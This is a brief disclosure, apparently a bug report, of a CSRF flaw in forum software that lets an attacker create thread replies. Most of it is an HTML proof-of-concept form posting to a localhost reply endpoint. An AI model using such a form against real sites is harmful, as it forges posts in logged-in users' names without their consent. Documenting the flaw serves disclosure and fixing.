# Thread Reply CSRF
Allows to create new posts on threads through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form id="LAYER_form" action="http://localhost/reply.php/test.1" method="POST" style="padding: 25px;">
    <textarea id="editor" style="width: 100%; height: 300px;" name="content"></textarea>
    <p class="pull-right" style="margin-top:5px;">
        <input type="submit" name="reply" value="Post Reply">
    </p>
</form>
```
